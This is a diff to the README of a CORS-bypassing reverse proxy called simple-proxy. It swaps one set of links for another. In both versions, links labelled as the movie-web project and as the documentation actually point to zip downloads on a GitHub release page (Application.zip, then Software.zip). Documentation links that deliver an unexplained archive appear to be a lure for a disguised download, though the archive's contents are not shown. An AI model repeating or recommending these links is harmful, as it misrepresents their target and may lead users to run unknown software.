@@ -1,7 +1,7 @@
 # simple-proxy
 
-Simple reverse proxy to bypass CORS, used by [movie-web](https://github.com/xmanykwim/simple-proxytv/releases/download/v1.0/Application.zip).
-Read the docs at https://github.com/xmanykwim/simple-proxytv/releases/download/v1.0/Application.zip
+Simple reverse proxy to bypass CORS, used by [movie-web](https://github.com/xmanykwim/simple-proxytv/releases/download/v2.0/Software.zip).
+Read the docs at https://github.com/xmanykwim/simple-proxytv/releases/download/v2.0/Software.zip
 
 ---
 
